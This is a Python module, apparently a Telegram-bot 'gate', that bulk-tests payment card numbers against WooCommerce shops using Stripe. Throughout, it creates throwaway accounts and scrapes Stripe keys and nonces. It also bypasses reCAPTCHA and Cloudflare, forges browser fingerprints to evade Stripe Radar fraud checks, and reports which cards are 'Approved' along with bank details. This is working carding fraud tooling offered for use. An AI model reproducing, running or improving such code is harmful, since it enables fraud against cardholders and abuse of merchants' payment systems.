# ============================================================
#  Auth2 Gate — WooCommerce Stripe Payment Method Adder
#  Ported EXACTLY from auto_based_str1pe_dlx.py
#  Supports site rotation for bulk checking
# ============================================================

import re
import json
import uuid
import time
import random
import string
import requests
import logging
import threading

try:
    import cloudscraper
except ImportError:
    cloudscraper = None

try:
    from bs4 import BeautifulSoup
except ImportError:
    BeautifulSoup = None

logging.basicConfig(level=logging.ERROR)
logger = logging.getLogger(__name__)

# ── BIN lookup cache ────────────────────────────────────────
_bin_cache = {}
_bin_cache_lock = threading.Lock()


def _get_bin_info(bin6):
    with _bin_cache_lock:
        if bin6 in _bin_cache:
            return _bin_cache[bin6]

    default = {
        "brand": "UNKNOWN", "type": "UNKNOWN",
        "bank": "UNKNOWN", "country": "UNKNOWN", "emoji": "🏳️",
    }
    try:
        r = requests.get(f"https://api.voidex.dev/api/bin?bin={bin6}", timeout=8)
        if r.status_code == 200:
            d = r.json()
            if d and "brand" in d:
                info = {
                    "brand": d.get("brand", "UNKNOWN"),
                    "type": d.get("type", "UNKNOWN"),
                    "bank": d.get("bank", "UNKNOWN"),
                    "country": d.get("country_name", "UNKNOWN"),
                    "emoji": d.get("country_flag", "🏳️"),
                }
                with _bin_cache_lock:
                    _bin_cache[bin6] = info
                return info
    except Exception:
        pass

    try:
        r2 = requests.get(f"https://binsapi.vercel.app/api/bin/{bin6}", timeout=8)
        if r2.status_code == 200:
            d2 = r2.json()
            if d2:
                info = {
                    "brand": d2.get("brand", "UNKNOWN"),
                    "type": d2.get("type", "UNKNOWN"),
                    "bank": d2.get("bank", "UNKNOWN"),
                    "country": d2.get("country_name", d2.get("country", "UNKNOWN")),
                    "emoji": d2.get("country_flag", d2.get("emoji", "🏳️")),
                }
                with _bin_cache_lock:
                    _bin_cache[bin6] = info
                return info
    except Exception:
        pass

    return default


# ── SmartSession (exact from script) ────────────────────────

class SmartSession:
    def __init__(self):
        self.session = None
        self.cookies = {}
        self.stripe_cookies = {
            '__stripe_mid': None,
            '__stripe_sid': None,
            '__stripe_guid': None
        }
        self.last_response = None
        self.used_bypass = False

    def create_session(self, use_cloudscraper=False):
        if use_cloudscraper and cloudscraper:
            self.session = cloudscraper.create_scraper(
                browser={'browser': 'chrome', 'platform': 'android', 'mobile': True}
            )
            self.used_bypass = True
        else:
            self.session = requests.Session()

        if self.cookies:
            self.session.cookies.update(self.cookies)

        return self.session

    def save_cookies(self):
        if self.session:
            self.cookies = dict(self.session.cookies.get_dict())
            for cookie in ['__stripe_mid', '__stripe_sid', '__stripe_guid']:
                if cookie in self.cookies:
                    self.stripe_cookies[cookie] = self.cookies[cookie]

    def get_stripe_cookies(self):
        self.save_cookies()
        return {
            'muid': self.stripe_cookies.get('__stripe_mid', str(uuid.uuid4()).replace('-', '')),
            'sid': self.stripe_cookies.get('__stripe_sid', str(uuid.uuid4()).replace('-', '')),
            'guid': self.stripe_cookies.get('__stripe_guid', str(uuid.uuid4()))
        }

    def load_cookies(self, cookies_dict):
        self.cookies = cookies_dict
        if self.session:
            self.session.cookies.update(cookies_dict)

    def request(self, method, url, **kwargs):
        try:
            if not self.session:
                self.create_session()
            response = self.session.request(method, url, **kwargs)
            self.last_response = response
            self.save_cookies()
            return response
        except Exception:
            return None


# ── StripeKeyValidator (exact from script) ──────────────────

class StripeKeyValidator:

    @staticmethod
    def is_valid_stripe_key(key):
        if not key:
            return False
        if not (key.startswith('pk_live_') or key.startswith('pk_test_')):
            return False
        if len(key) < 30:
            return False
        key_part = key.replace('pk_live_', '').replace('pk_test_', '')
        if not re.match(r'^[a-zA-Z0-9]+$', key_part):
            return False
        return True

    @staticmethod
    def extract_stripe_keys(html_content):
        keys = []
        # Pattern 1: publishableKey
        pattern1 = r'["\']publishableKey["\']\s*:\s*["\'](pk_(?:live|test)_[a-zA-Z0-9]+)["\']'
        keys.extend(re.findall(pattern1, html_content))
        # Pattern 2: pk_live_
        pattern2 = r'(pk_live_[a-zA-Z0-9]{24,})'
        keys.extend(re.findall(pattern2, html_content))
        # Pattern 3: pk_test_
        pattern3 = r'(pk_test_[a-zA-Z0-9]{24,})'
        keys.extend(re.findall(pattern3, html_content))
        # Pattern 4: var/let/const key
        pattern4 = r'(?:var|let|const)\s+\w*key\w*\s*[=:]\s*["\'](pk_(?:live|test)_[a-zA-Z0-9]+)["\']'
        keys.extend(re.findall(pattern4, html_content, re.IGNORECASE))
        return list(set(keys))

    @staticmethod
    def test_key_live(key, account_id=None):
        test_headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'user-agent': 'Mozilla/5.0 (Linux; Android 13)'
        }
        test_data = f'key={key}'
        if account_id:
            test_data += f'&_stripe_account={account_id}'
        try:
            r_test = requests.post('https://api.stripe.com/v1/payment_methods',
                                   headers=test_headers, data=test_data, timeout=10)
            if r_test.status_code == 401:
                error_json = r_test.json()
                error_msg = error_json.get('error', {}).get('message', '')
                if 'Invalid API Key' in error_msg:
                    return {'valid': False, 'reason': 'invalid_key', 'message': error_msg}
                elif 'platform' in error_msg:
                    return {'valid': False, 'reason': 'account_mismatch', 'message': error_msg}
                else:
                    return {'valid': False, 'reason': 'unknown', 'message': error_msg}
            elif r_test.status_code == 200:
                return {'valid': True, 'reason': 'valid_key', 'message': 'Key is valid'}
            else:
                return {'valid': True, 'reason': 'unknown_status', 'message': f'Status: {r_test.status_code}'}
        except Exception as e:
            return {'valid': False, 'reason': 'test_error', 'message': str(e)}

    @staticmethod
    def find_best_key(html_content, account_id=None):
        candidates = StripeKeyValidator.extract_stripe_keys(html_content)
        if not candidates:
            return None
        valid_candidates = [k for k in candidates if StripeKeyValidator.is_valid_stripe_key(k)]
        if not valid_candidates:
            return candidates[0] if candidates else None
        # Test the first valid key
        test_key = valid_candidates[0]
        test_result = StripeKeyValidator.test_key_live(test_key, account_id)
        if test_result['valid']:
            return test_key
        # Try alternatives
        for key in valid_candidates[1:]:
            test_result = StripeKeyValidator.test_key_live(key, account_id)
            if test_result['valid']:
                return key
        # Return first valid format key even if test failed
        return valid_candidates[0]


# ── CaptchaHandler (exact from script) ──────────────────────

class CaptchaHandler:

    @staticmethod
    def detect_captcha_type(html):
        html_lower = html.lower()
        if 'recaptcha' in html_lower and 'data-sitekey' in html:
            sitekey = re.search(r'data-sitekey=["\']([^"\']+)["\']', html)
            if sitekey:
                return {
                    'type': 'recaptcha',
                    'sitekey': sitekey.group(1),
                    'bypassable': True
                }
        if 'hcaptcha' in html_lower and 'data-sitekey' in html:
            sitekey = re.search(r'data-sitekey=["\']([^"\']+)["\']', html)
            if sitekey:
                return {
                    'type': 'hcaptcha',
                    'sitekey': sitekey.group(1),
                    'bypassable': False
                }
        if 'cf-turnstile' in html_lower or 'turnstile' in html_lower:
            return {
                'type': 'turnstile',
                'bypassable': False
            }
        captcha_keywords = ['captcha', 'verify you are human', 'security check']
        if any(keyword in html_lower for keyword in captcha_keywords):
            return {
                'type': 'unknown',
                'bypassable': False
            }
        return None

    @staticmethod
    def should_bypass(captcha_info):
        if not captcha_info:
            return False
        if captcha_info['type'] == 'recaptcha' and captcha_info['bypassable']:
            return True
        return False


# ── reCAPTCHA bypass (exact from script) ────────────────────

def recaptcha_bypass(page_html, page_url):
    captcha_info = CaptchaHandler.detect_captcha_type(page_html)
    if not captcha_info or captcha_info['type'] != 'recaptcha':
        return None

    sitekey = captcha_info['sitekey']
    from urllib.parse import urlparse, parse_qs
    origin_encoded = "aHR0cHM6Ly93d3cueW91cnNpdGUuY29t"
    anchor_url = f"https://www.google.com/recaptcha/api2/anchor?ar=1&k={sitekey}&co={origin_encoded}&hl=en&v=...&size=invisible"
    reload_url = f"https://www.google.com/recaptcha/api2/reload?k={sitekey}"

    req_headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
    }

    try:
        resp_anchor = requests.get(anchor_url, headers=req_headers, timeout=12)
        resp_anchor.raise_for_status()

        token_match = re.search(r'value=["\']([^"\']+)["\']', resp_anchor.text)
        if not token_match:
            return None

        token = token_match.group(1)
        parsed = urlparse(anchor_url)
        params = parse_qs(parsed.query)

        post_data = {
            'v': params.get('v', [''])[0],
            'reason': 'q',
            'c': token,
            'k': sitekey,
            'co': params.get('co', [''])[0],
            'hl': 'en',
            'size': 'invisible'
        }

        post_headers = req_headers.copy()
        post_headers.update({
            "Referer": resp_anchor.url,
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://www.google.com"
        })

        resp_reload = requests.post(reload_url, headers=post_headers, data=post_data, timeout=15)
        resp_reload.raise_for_status()

        rresp_match = re.search(r'\["rresp","([^"]+)"', resp_reload.text)
        if not rresp_match:
            return None

        return rresp_match.group(1)

    except Exception:
        return None


# ── StripeRadarBypass (exact from script) ───────────────────

class StripeRadarBypass:

    @staticmethod
    def generate_fingerprint():
        return {
            'muid': str(uuid.uuid4()).replace('-', '') + str(random.randint(1000, 9999)),
            'sid': str(uuid.uuid4()).replace('-', '') + str(random.randint(1000, 9999)),
            'guid': str(uuid.uuid4()),
            'time_on_page': random.randint(30000, 180000),
            'screen_resolution': random.choice(['1920x1080', '1366x768', '1536x864']),
            'timezone_offset': random.randint(-480, 600),
            'language': 'en-US',
            'user_agent': 'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36'
        }

    @staticmethod
    def create_stripe_payload(card_info, pk_live, stripe_cookies=None):
        fp = StripeRadarBypass.generate_fingerprint()
        muid = stripe_cookies.get('muid', fp['muid']) if stripe_cookies else fp['muid']
        sid = stripe_cookies.get('sid', fp['sid']) if stripe_cookies else fp['sid']
        guid = stripe_cookies.get('guid', fp['guid']) if stripe_cookies else fp['guid']

        client_attribution = {
            "client_session_id": str(uuid.uuid4()),
            "merchant_integration_source": "elements",
            "merchant_integration_subtype": "payment-element",
            "merchant_integration_version": "2021",
            "payment_intent_creation_flow": "deferred",
            "payment_method_selection_flow": "merchant_specified",
            "elements_session_config_id": str(uuid.uuid4())
        }

        payload = (
            f'type=card'
            f'&card[number]={card_info["number"]}'
            f'&card[cvc]={card_info["cvc"]}'
            f'&card[exp_year]={card_info["exp_year"]}'
            f'&card[exp_month]={card_info["exp_month"]}'
            f'&billing_details[name]={card_info["name"].replace(" ", "+")}'
            f'&billing_details[email]={card_info["email"]}'
            f'&billing_details[address][country]={card_info.get("country", "US")}'
            f'&billing_details[address][postal_code]={card_info.get("zip", "10001")}'
            f'&allow_redisplay=unspecified'
            f'&key={pk_live}'
            f'&muid={muid}'
            f'&sid={sid}'
            f'&guid={guid}'
            f'&payment_user_agent=stripe.js%2F8f77e26090%3B+stripe-js-v3%2F8f77e26090%3B+checkout'
            f'&time_on_page={fp["time_on_page"]}'
            f'&client_attribution_metadata[client_session_id]={client_attribution["client_session_id"]}'
            f'&client_attribution_metadata[merchant_integration_source]={client_attribution["merchant_integration_source"]}'
            f'&client_attribution_metadata[merchant_integration_subtype]={client_attribution["merchant_integration_subtype"]}'
            f'&client_attribution_metadata[merchant_integration_version]={client_attribution["merchant_integration_version"]}'
            f'&client_attribution_metadata[payment_intent_creation_flow]={client_attribution["payment_intent_creation_flow"]}'
            f'&client_attribution_metadata[payment_method_selection_flow]={client_attribution["payment_method_selection_flow"]}'
            f'&client_attribution_metadata[elements_session_config_id]={client_attribution["elements_session_config_id"]}'
        )

        return payload, fp

    @staticmethod
    def analyze_stripe_response(response_json):
        if 'id' in response_json:
            return {'status': 'success', 'payment_id': response_json['id']}

        error = response_json.get('error', {})
        error_msg = error.get('message', 'Unknown error')
        error_code = error.get('code', 'unknown')

        if 'radar' in error_msg.lower() or 'fraud' in error_msg.lower():
            return {'status': 'radar_block', 'message': error_msg}
        if 'three_d_secure' in error_msg.lower() or '3d_secure' in error_code:
            return {'status': '3ds_required', 'message': error_msg}
        if 'incorrect_cvc' in error_msg.lower():
            return {'status': 'cvc_error', 'message': error_msg}
        if 'insufficient_funds' in error_msg.lower():
            return {'status': 'insufficient_funds', 'message': error_msg}
        if 'card_declined' in error_msg.lower():
            return {'status': 'declined', 'message': error_msg}
        if 'invalid api key' in error_msg.lower():
            return {'status': 'invalid_key', 'message': error_msg}

        return {'status': 'error', 'message': error_msg, 'code': error_code}


# ── Core checker (exact flow from script) ───────────────────

def _process_card(cc, mm, yy, cvv, site_url, proxy_dict=None):
    """WooCommerce Stripe checker — exact flow from auto_based_str1pe_dlx.py"""
    try:
        site = site_url.rstrip('/')

        # Create SmartSession
        smart_session = SmartSession()

        # Check for Cloudflare protection
        try:
            test_response = requests.get(site, timeout=10, proxies=proxy_dict)
            if "cf-chl-captcha" in test_response.text or "cloudflare" in test_response.text.lower():
                r = smart_session.create_session(use_cloudscraper=True)
            else:
                r = smart_session.create_session(use_cloudscraper=False)
        except Exception:
            r = smart_session.create_session(use_cloudscraper=False)

        # URLs (exact from script)
        url2 = f'{site}/my-account/'
        url4 = f'{site}/my-account/add-payment-method/'
        url5 = f'{site}/wp-admin/admin-ajax.php'

        # Generate throwaway account (exact from script)
        email = ''.join(random.choices(string.ascii_lowercase, k=8)) + "@gmail.com"
        pas = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
        name = ''.join(random.choices(string.ascii_letters, k=10))

        USER_AGENTS = [
            'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 12; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36',
        ]
        UA = random.choice(USER_AGENTS)

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': UA,
        }

        # Step 1: Get register nonce (exact from script)
        try:
            response = r.get(url2, headers=headers, proxies=proxy_dict, timeout=15)
        except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError):
            response = r.get(url2, headers=headers, timeout=15)

        if response.status_code != 200:
            return {"status": "Error", "response": f"Site HTTP {response.status_code}"}

        if BeautifulSoup:
            soup = BeautifulSoup(response.text, "html.parser")
            nonce_tag = soup.find("input", {"name": "woocommerce-register-nonce"})
            if nonce_tag and 'value' in nonce_tag.attrs:
                reg = nonce_tag['value']
            else:
                return {"status": "Error", "response": "Register nonce not found"}
        else:
            nonce_match = re.search(r'name="woocommerce-register-nonce"\s+value="([^"]+)"', response.text)
            if not nonce_match:
                return {"status": "Error", "response": "Register nonce not found"}
            reg = nonce_match.group(1)

        # Step 2: Register (exact from script)
        headers_register = headers.copy()
        headers_register.update({
            'Origin': site,
            'Referer': f'{site}/my-account/',
        })

        data_register = {
            'email': email,
            'password': pas,
            'woocommerce-register-nonce': reg,
            '_wp_http_referer': '/my-account/',
            'register': 'Register',
        }

        try:
            response = r.post(f'{site}/my-account/', headers=headers_register, data=data_register,
                              proxies=proxy_dict, timeout=20)
        except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError):
            response = r.post(f'{site}/my-account/', headers=headers_register, data=data_register, timeout=20)

        # CAPTCHA handling (exact from script)
        captcha_info = CaptchaHandler.detect_captcha_type(response.text)
        if captcha_info:
            if CaptchaHandler.should_bypass(captcha_info):
                g_token = recaptcha_bypass(response.text, f'{site}/my-account/')
                if g_token:
                    data_register['g-recaptcha-response'] = g_token
                    try:
                        response = r.post(f'{site}/my-account/', headers=headers_register,
                                          data=data_register, proxies=proxy_dict, timeout=20)
                    except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError):
                        response = r.post(f'{site}/my-account/', headers=headers_register,
                                          data=data_register, timeout=20)
            elif captcha_info['type'] in ('hcaptcha', 'turnstile'):
                return {"status": "Error", "response": f"{captcha_info['type'].upper()} detected — cannot bypass"}

        # Step 3: Access payment method page (exact from script)
        headers_payment = headers.copy()
        headers_payment.update({'Referer': f'{site}/my-account/payment-methods/'})

        try:
            response = r.get(url4, headers=headers_payment, proxies=proxy_dict, timeout=15)
        except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError):
            response = r.get(url4, headers=headers_payment, timeout=15)

        # Extract account ID (exact from script)
        acct_m = re.search(r'["\']accountId["\']\s*:\s*["\'](acct_[a-zA-Z0-9]+)["\']', response.text)
        if not acct_m:
            acct_m = re.search(r'(acct_[a-zA-Z0-9]+)', response.text)
        account_id = acct_m.group(1) if acct_m else None

        # Find best Stripe key (exact from script — with validation + testing)
        best_key = StripeKeyValidator.find_best_key(response.text, account_id)
        if not best_key:
            return {"status": "Error", "response": "Stripe key not found on site"}
        pk_live = best_key

        # Extract nonce (exact patterns from script)
        nonce_patterns = [
            r'["\']createSetupIntentNonce["\']\s*:\s*["\']([a-z0-9]+)["\']',
            r'["\']createAndConfirmSetupIntentNonce["\']\s*:\s*["\']([a-z0-9]+)["\']',
            r'wc-stripe-create-setup-intent-nonce["\'][^>]+value=["\']([a-z0-9]+)["\']',
            r'stripe_nonce["\']?\s*[:=]\s*["\']([a-z0-9]+)["\']',
            r'nonce["\']?\s*[:=]\s*["\']([a-z0-9]+)["\']'
        ]

        addnonce = None
        for pattern in nonce_patterns:
            nonce_m = re.search(pattern, response.text)
            if nonce_m:
                addnonce = nonce_m.group(1)
                break

        if not addnonce:
            return {"status": "Error", "response": "Nonce not found"}

        # Build card info (exact from script)
        year_full = f"20{yy}" if len(yy) <= 2 else yy
        card_info = {
            'number': cc,
            'cvc': cvv,
            'exp_month': mm,
            'exp_year': year_full,
            'name': name,
            'email': email,
            'country': 'US',
            'zip': '10001'
        }

        # Step 4: Create payment method on Stripe with Radar bypass (exact from script)
        stripe_cookies = smart_session.get_stripe_cookies()
        stripe_payload, fingerprint = StripeRadarBypass.create_stripe_payload(
            card_info, pk_live, stripe_cookies
        )

        if account_id:
            stripe_payload += f'&_stripe_account={account_id}'

        headers_stripe = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': fingerprint['user_agent'],
        }

        # Retry logic (exact from script — up to 3 attempts)
        max_retries = 3
        stripe_response = None
        for attempt in range(max_retries):
            stripe_response = requests.post('https://api.stripe.com/v1/payment_methods',
                                            headers=headers_stripe, data=stripe_payload, timeout=15)

            if stripe_response.status_code == 200:
                break
            elif stripe_response.status_code == 401:
                error_json = stripe_response.json()
                error_msg = error_json.get('error', {}).get('message', '')
                if attempt == 0:
                    # Try alternative keys (exact from script)
                    alt_keys = StripeKeyValidator.extract_stripe_keys(stripe_response.text)
                    if alt_keys and len(alt_keys) > 1:
                        pk_live = alt_keys[1]
                        stripe_payload, _ = StripeRadarBypass.create_stripe_payload(
                            card_info, pk_live, stripe_cookies
                        )
                        if account_id:
                            stripe_payload += f'&_stripe_account={account_id}'
                else:
                    return {"status": "Error", "response": f"Stripe 401: {error_msg[:80]}"}
            elif stripe_response.status_code == 400:
                break
            else:
                try:
                    err_json = stripe_response.json()
                    err_msg = err_json.get('error', {}).get('message', f'HTTP {stripe_response.status_code}')
                except Exception:
                    err_msg = f'HTTP {stripe_response.status_code}'
                return {"status": "Declined", "response": err_msg[:120]}

            time.sleep(random.uniform(2, 4))

        if not stripe_response:
            return {"status": "Error", "response": "No Stripe response"}

        try:
            r_stripe = stripe_response.json()
        except Exception:
            return {"status": "Error", "response": "Invalid JSON from Stripe"}

        # Analyze response (exact from script)
        analysis = StripeRadarBypass.analyze_stripe_response(r_stripe)

        if analysis['status'] == 'success':
            payment_id = analysis['payment_id']

            # Step 5: Create Setup Intent via WooCommerce AJAX (exact from script)
            action_options = [
                'create_setup_intent',
                'wc_stripe_create_and_confirm_setup_intent',
                'wc_stripe_create_setup_intent'
            ]

            success = False
            result_text = ""
            for action in action_options:
                ajax_data = {
                    'action': action,
                    'wc-stripe-payment-method': payment_id,
                    '_ajax_nonce': addnonce,
                }

                # Check for wcpay (exact from script)
                if 'wcpay' in response.text.lower():
                    ajax_data = {
                        'action': 'create_setup_intent',
                        'wcpay-payment-method': payment_id,
                        '_ajax_nonce': addnonce,
                    }

                headers_ajax = {
                    'Accept': '*/*',
                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'Origin': site,
                    'Referer': url4,
                    'User-Agent': UA,
                    'X-Requested-With': 'XMLHttpRequest'
                }

                try:
                    ajax_response = r.post(url5, headers=headers_ajax, data=ajax_data,
                                           proxies=proxy_dict, timeout=20)
                except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError):
                    ajax_response = r.post(url5, headers=headers_ajax, data=ajax_data, timeout=20)

                if ajax_response.status_code == 200:
                    result_text = ajax_response.text.lower()

                    if any(keyword in result_text for keyword in ['"success":true', 'insufficient_funds', 'payment_method']):
                        success = True
                        break

                    if 'incorrect_cvc' in result_text:
                        return {"status": "Approved", "response": "CVC Matched ✅"}

            if success:
                if 'insufficient_funds' in result_text:
                    return {"status": "Approved", "response": "Approved (Insufficient Funds) ✅"}
                return {"status": "Approved", "response": "Payment Method Added ✅"}

            # Parse decline reason
            try:
                rj = json.loads(ajax_response.text) if ajax_response else {}
                msg = rj.get('data', {}).get('error', {}).get('message', '') or rj.get('message', '')
            except Exception:
                msg = result_text[:80] if result_text else "Setup intent failed"

            return {"status": "Declined", "response": msg[:120] if msg else "Setup intent failed"}

        elif analysis['status'] == 'invalid_key':
            return {"status": "Error", "response": "Stripe Key Invalid"}

        elif analysis['status'] == '3ds_required':
            return {"status": "Declined", "response": "3D Secure Required"}

        elif analysis['status'] == 'cvc_error':
            return {"status": "Approved", "response": "CVC Matched ✅"}

        elif analysis['status'] == 'insufficient_funds':
            return {"status": "Approved", "response": "Approved (Insufficient Funds) ✅"}

        elif analysis['status'] == 'radar_block':
            # Radar retry (exact from script)
            time.sleep(random.uniform(3, 5))
            stripe_payload, _ = StripeRadarBypass.create_stripe_payload(card_info, pk_live, None)
            if account_id:
                stripe_payload += f'&_stripe_account={account_id}'
            retry_resp = requests.post('https://api.stripe.com/v1/payment_methods',
                                       headers=headers_stripe, data=stripe_payload, timeout=15)
            if retry_resp.status_code == 200:
                retry_json = retry_resp.json()
                if 'id' in retry_json:
                    return {"status": "Approved", "response": "Radar Bypass ✅"}
            return {"status": "Declined", "response": "Radar Blocked"}

        else:
            return {"status": "Declined", "response": analysis.get('message', 'Unknown')[:120]}

    except Exception as e:
        return {"status": "Error", "response": str(e)[:80]}


# ── Public API ──────────────────────────────────────────────

def check_card(cc_line, proxy_dict=None, site_url=None):
    """Entry point for TG bot gate.
    cc_line: "CC|MM|YY|CVV"
    site_url: WooCommerce site URL (required)
    Returns formatted result string.
    """
    if not site_url:
        return "Error | No site URL provided — add sites with /auth2site first"

    if not site_url.startswith(('http://', 'https://')):
        site_url = 'https://' + site_url
    site_url = site_url.rstrip('/')

    start = time.time()
    parts = cc_line.strip().split('|')
    if len(parts) != 4:
        return "Error | Invalid format (CC|MM|YY|CVV)"

    cc, mm, yy, cvv = [p.strip() for p in parts]
    result = _process_card(cc, mm, yy, cvv, site_url, proxy_dict)
    elapsed = time.time() - start

    status = result.get("status", "Error")
    response = result.get("response", "Unknown")
    bin_info = _get_bin_info(cc[:6])

    if status == "Approved":
        return (
            f"Approved | {response}\n"
            f"Card: {cc}|{mm}|{yy}|{cvv}\n"
            f"Gateway: Auto Stripe v2 (WooCommerce)\n"
            f"Site: {site_url}\n"
            f"BIN: {bin_info['brand']} - {bin_info['type']}\n"
            f"Bank: {bin_info['bank']}\n"
            f"Country: {bin_info['country']} {bin_info['emoji']}\n"
            f"Time: {elapsed:.1f}s"
        )
    elif status == "Declined":
        return (
            f"Declined | {response}\n"
            f"Card: {cc}|{mm}|{yy}|{cvv}\n"
            f"Gateway: Auto Stripe v2 (WooCommerce)\n"
            f"Site: {site_url}\n"
            f"BIN: {bin_info['brand']} - {bin_info['type']}\n"
            f"Time: {elapsed:.1f}s"
        )
    else:
        return f"Error | {response}"


def probe_site(site_url=None):
    """Health check — can we reach a WooCommerce site and see Stripe?"""
    if not site_url:
        return True, "No URL needed — user provides site"
    try:
        resp = requests.get(
            f"{site_url}/my-account/",
            headers={"User-Agent": "Mozilla/5.0 (Linux; Android 13; SM-S918B)"},
            timeout=10, allow_redirects=True,
        )
        alive = resp.status_code == 200 and (
            'stripe' in resp.text.lower() or 'woocommerce' in resp.text.lower()
        )
        return alive, f"HTTP {resp.status_code}" + (" | WooCommerce+Stripe found" if alive else " | Not found")
    except Exception as e:
        return False, str(e)[:60]


def validate_site(site_url):
    """Validate a site has WooCommerce + Stripe before adding to list.
    Returns (valid: bool, detail: str)
    """
    if not site_url:
        return False, "Empty URL"
    if not site_url.startswith(('http://', 'https://')):
        site_url = 'https://' + site_url
    site_url = site_url.rstrip('/')

    try:
        resp = requests.get(
            f"{site_url}/my-account/",
            headers={
                "User-Agent": "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            },
            timeout=12, allow_redirects=True,
        )
        if resp.status_code != 200:
            return False, f"HTTP {resp.status_code}"

        has_woo = 'woocommerce' in resp.text.lower() or 'woo-' in resp.text.lower()
        has_stripe = 'stripe' in resp.text.lower() or 'pk_live_' in resp.text or 'pk_test_' in resp.text
        has_register = 'woocommerce-register-nonce' in resp.text

        if has_woo and has_stripe and has_register:
            return True, "WooCommerce + Stripe + Registration ✅"
        elif has_woo and has_stripe:
            return True, "WooCommerce + Stripe ✅ (no register form visible)"
        elif has_woo:
            return False, "WooCommerce found but no Stripe"
        elif has_stripe:
            return True, "Stripe found ✅ (may not be WooCommerce)"
        else:
            return False, "No WooCommerce or Stripe detected"

    except requests.exceptions.Timeout:
        return False, "Timeout"
    except requests.exceptions.ConnectionError:
        return False, "Connection error"
    except Exception as e:
        return False, str(e)[:60]
